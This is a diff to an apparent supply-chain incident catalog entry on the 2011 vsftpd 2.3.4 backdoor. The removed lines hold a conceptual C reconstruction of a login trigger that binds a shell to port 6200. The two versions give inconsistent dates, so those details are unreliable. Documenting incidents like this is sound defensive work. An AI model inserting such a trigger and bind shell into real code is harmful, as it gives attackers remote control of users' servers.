@@ -1,71 +1,20 @@
-- name: VSFTPD
-  title: VSFTPD backdoored distribution
-  start_date: 2011-07-01
-  end_date: 2011-07-03
-  license: GPL
-  website: https://security.appspot.com/vsftpd.html
-  repo: https://github.com/vsftpd/vsftpd
-  attribution_type: unknown
-  component_type: Application
-  lang: C
-  cause: compromise
-  motive: backdoor
-  attack_vector: server compromise
-  insertion_phase: distribution
-  impact_type: backdoor
-  impact_user_count: 1000
+- name: vsftpd
+  title: vsftpd official distribution site compromised distributing backdoor
+  synopsis: The FTP server hosting the official vsftpd source code tarballs was compromised. For a brief period, the download for vsftpd version 2.3.4 was replaced with a version containing a backdoor. This backdoor opened a listening shell on TCP port 6200 when a username ending in ':)' was used to log in.
+  start_date: 2011-07-03 # Approximate date/time of compromise
+  end_date: 2011-07-03 # Discovered and removed very quickly
+  attribution_type: Individual hacker
+  component_type: Application # FTP Server
+  lang: C # Backdoor code in C source
+  cause: Server compromise # Master distribution site hacked
+  motive: Remote access # Listening shell
+  insertion_phase: distribution # Official download source tarball replaced
+  impact_type: Backdoor, Remote execution
   references:
-    - https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
-    - https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
-    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
-    - https://nvd.nist.gov/vuln/detail/CVE-2011-2523
-    - https://www.computerworld.com/article/2519193/vsftpd-developer-says-server-compromised--backdoor-planted-in-code.html
-  artifacts:
-    - https://pastebin.com/AetT9sS5
+    - https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html # Author's blog post
+    - https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ # Exploit module details
+    - https://www.computerworld.com/article/2518230/vsftpd-developer-confirms-backdoor-in-version-2-3-4.html # News report
   versions:
-    - 2.3.4
-  synopsis: The official VSFTPD distribution was compromised with a backdoor that opened a remote shell. The backdoor was triggered when a smiley face ":)" was included in the username during login.
-  compromise_desc: Unknown attackers compromised the download site for VSFTPD and replaced the legitimate tarball with a backdoored version. The backdoor was designed to open a listener on port 6200 when a username containing the characters ":)" was used during authentication.
-  impact_desc: The backdoor allowed attackers to gain remote shell access to systems running the compromised version of VSFTPD. The compromised version was available for download for approximately 3 days before being discovered and removed.
-  example_code: |
-    /* Simplified conceptual code illustrating trigger and action.
-          Actual implementation involved hijacking existing function calls. */
-
-       // Function to check for :) sequence in username (e.g., in str.c)
-       int contains_smile(const char* username) {
-           return strstr(username, ":)") != NULL;
-       }
-
-       // In main connection handling logic (e.g., main.c)
-       if (contains_smile(session_username)) {
-           // Call function containing the backdoor payload
-           // (e.g., by modifying an existing function call target)
-           backdoor_activate();
-       }
-
-       // Backdoor payload function (e.g., hidden in str.c or elsewhere)
-       void backdoor_activate() {
-           int listen_fd, conn_fd;
-           struct sockaddr_in sa;
-
-           sa.sin_family = AF_INET;
-           sa.sin_port = htons(6200); // Listen on port 6200
-           sa.sin_addr.s_addr = INADDR_ANY;
-
-           listen_fd = socket(AF_INET, SOCK_STREAM, 0);
-           bind(listen_fd, (struct sockaddr*)&sa, sizeof(sa));
-           listen(listen_fd, 1);
-
-           conn_fd = accept(listen_fd, NULL, NULL);
-           close(listen_fd);
-
-           // Redirect stdin, stdout, stderr to socket
-           dup2(conn_fd, 0);
-           dup2(conn_fd, 1);
-           dup2(conn_fd, 2);
-
-           // Execute shell
-           execve("/bin/sh", NULL, NULL);
-           close(conn_fd);
-           exit(0); // Exit child process
-       }
+    - 2.3.4 # Specific source tarball vsftpd-2.3.4.tar.gz
+  impacted_hashes:
+    # Hashes difficult to confirm as file was removed quickly
